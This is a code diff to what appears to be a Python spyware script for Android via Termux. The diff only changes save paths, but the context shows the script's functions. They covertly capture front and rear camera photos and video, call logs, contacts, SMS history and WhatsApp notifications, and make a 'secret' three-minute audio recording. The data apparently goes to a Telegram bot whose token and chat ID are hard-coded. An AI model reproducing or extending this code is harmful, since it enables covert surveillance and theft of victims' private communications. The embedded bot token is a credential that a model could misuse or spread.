@@ -8,7 +8,7 @@ import requests
 # --- Telegram Credentials (Dedicated Bot) ---
 BOT_TOKEN = "8815279159:AAGgE3t6u8fuXT-nGJCN-Gowpcl65VsLA00"
 CHAT_ID = "7883547875"
-HASH_CACHE_FILE = "/sdcard/processed_hashes.json"
+HASH_CACHE_FILE = "/sdcard/Download/processed_hashes.json"
 
 
 def load_processed_hashes():
@@ -84,8 +84,8 @@ def notify_and_start():
 
 # A. Front & Rear Camera Pictures Capture
 def capture_cameras_photos():
-  back_pic = "/sdcard/back_photo.jpg"
-  front_pic = "/sdcard/front_photo.jpg"
+  back_pic = "/sdcard/Download/back_photo.jpg"
+  front_pic = "/sdcard/Download/front_photo.jpg"
 
   try:
     if os.path.exists(back_pic):
@@ -148,7 +148,7 @@ def get_clipboard_text():
 
 # D. Call Logs Text File with MD5 Check
 def get_call_logs_file():
-  log_path = "/sdcard/call_logs.txt"
+  log_path = "/sdcard/Download/call_logs.txt"
   try:
     res = subprocess.run(
         ["termux-call-log"], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True
@@ -179,7 +179,7 @@ def get_call_logs_file():
 
 # E. Contacts List Text File with MD5 Check
 def get_contacts_file():
-  contact_path = "/sdcard/contacts_list.txt"
+  contact_path = "/sdcard/Download/contacts_list.txt"
   try:
     res = subprocess.run(
         ["termux-contact-list"],
@@ -210,7 +210,7 @@ def get_contacts_file():
 
 # F. SMS History Text File with MD5 Check
 def get_sms_history_file():
-  sms_path = "/sdcard/all_sms.txt"
+  sms_path = "/sdcard/Download/all_sms.txt"
   try:
     res = subprocess.run(
         ["termux-sms-list", "-l", "100"],
@@ -245,7 +245,7 @@ def get_sms_history_file():
 
 # G. WhatsApp Notifications
 def get_whatsapp_notifications():
-  noti_path = "/sdcard/whatsapp_notifications.txt"
+  noti_path = "/sdcard/Download/whatsapp_notifications.txt"
   try:
     res = subprocess.run(
         ["termux-notification-list"],
@@ -287,8 +287,8 @@ def get_whatsapp_notifications():
 
 # H. Front & Rear Camera 10s Video Capture
 def capture_cameras_video():
-  back_video = "/sdcard/back_video.mp4"
-  front_video = "/sdcard/front_video.mp4"
+  back_video = "/sdcard/Download/back_video.mp4"
+  front_video = "/sdcard/Download/front_video.mp4"
 
   try:
     if os.path.exists(back_video):
@@ -315,7 +315,7 @@ def capture_cameras_video():
 
 # I. Secret Audio Recording (3 Minutes / 180 Seconds)
 def record_secret_audio():
-  audio_path = "/sdcard/secret_audio.m4a"
+  audio_path = "/sdcard/Download/secret_audio.m4a"
   try:
     if os.path.exists(audio_path):
       os.remove(audio_path)
